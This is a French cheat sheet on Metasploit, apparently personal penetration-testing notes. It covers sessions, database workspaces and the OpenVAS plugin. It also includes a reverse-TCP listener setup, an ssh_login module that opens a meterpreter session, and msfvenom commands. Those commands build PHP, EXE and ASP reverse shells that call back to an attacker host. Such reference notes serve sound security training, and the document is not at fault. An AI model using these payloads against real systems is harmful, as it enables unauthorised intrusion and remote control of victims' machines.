# metasploit

## Commandes de base

### Gestion sessions

Pour lister les sessions en cours :
```
msf> sessions -l
```

Pour basculer sur une session existante :
```
msf> sessions -i <id_session>
```

Pour passer une session en arrière plan :
```
meterpreter> background
```

### Listener

Lancer un listener en attente d'un reverse tcp meterpreter windows :
```
msf> use multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST <ip_kali>
msf> set LPORT <port_ecoute>
msf> exploit -j
```

## Base de données

On va travailler avec *PostgreSQL* qui est la base de données par défaut
dans *metasploit*.

### La première fois

Il faut d'abord lancer *PostgreSQL* puis initialiser la base de données
pour *metasploit* :
```
sudo systemctl start postgresql
msfdb init
```

Cela crée une base de données `msf` et un utilisateur `msf`.
Au démarrage de `msfconsole`, *metasploit* se connectera automatiquement à
cette base de données.
On peut vérifier qu'on est bien connecté :
```
msf> db_status
```

### Workspaces

On peut ensuite travailler avec des *workspaces* pour ranger ses différents
scans.

Pour lister les *workspaces* disponibles :
```
msf> workspace
```

Pour sélectionner un *workspace* :
```
msf> workspace <workspace_name>
```

Pour créer un *workspace*, on utilise l'option `-a` et pour supprimer un
*workspace* `-d`.
Plus d'information avec l'option `-h`.

### Importation de données

Pour importer des données dans la base :
```
msf> db_import <filename_to_import>
```

Pour faire un scan `nmap` et importer directement les résultats :
```
msf> db_nmap <...classical_nmap_options...>
```

### Lire des données

Pour voir les services scannés :
```
msf> services
```

Pour voir les hôtes scannés :
```
msf> hosts
```

On peut ajouter des éléments à afficher :
```
msf> hosts -c address,os_flavor,svcs,vulns
```

Pour voir les vulnérabilités trouvées :
```
msf> vulns
```

## OpenVAS dans Metasploit

Lancer d'abord une instance `OpenVAS`. Par défaut, l'interface web écoute sur
le port 9392 et le scanner sur le port 9390.

Pour lancer le plugin `OpenVAS` dans `metasploit` :
```
msf> load openvas
```

On se connecte à l'instance `OpenVAS` :
```
msf> openvas_connect <login> <password> 127.0.0.1 9390 ok
```

Pour lister les targets disponibles :
```
msf> openvas_target_list
```

Pour créer une nouvelle target :
```
msf> openvas_target_create <name> <ip> <comment>
```

Pour lister les configurations de scan possibles :
```
msf> openvas_config_list
```

Pour créer une task :
```
msf> openvas_task_create <name> <comment> <config_id> <target_id>
```

Pour lister les tasks :
```
msf> openvas_task_list
```

Pour lancer un scan :
```
msf> openvas_task_start <id>
```

Pour lister les rapports disponibles :
```
msf> openvas_report_list
```

Pour afficher les différents types de rapport disponibles :
```
msf> openvas_format_list
```

Pour télécharger un rapport :
```
msf> openvas_report_download <report_id> <format_id> <path> <report_name>
```

Pour importer un rapport dans metasploit :
```
msf> openvas_report_import <report_id> <format_id>
```

## Meterpreter

### Ouvrir un shell meterpreter à partir d'une connexion ssh

On peut utiliser le module `ssh_login` :
```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set RHOSTS 10.10.10.10
msf auxiliary(ssh_login) > set USERNAME foo
msf auxiliary(ssh_login) > set PASSWORD bar
msf auxiliary(ssh_login) > exploit
msf auxiliary(ssh_login) > sessions -u 1
```

## Payloads

### php (meterpreter)

Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
```

### windows exe (meterpreter)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
```

### windows asp (meterpreter)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f asp > shell.asp
```

## Sources

* <https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf>
* <https://www.ehacking.net/2011/11/how-to-use-openvas-in-metasploit.html>
* <https://www.offensive-security.com/metasploit-unleashed/using-databases/>
* <https://netsec.ws/?p=331>
* <https://dotweak.com/fr/2019/08/12/comment-creer-un-payload-metasploit-60545791/>
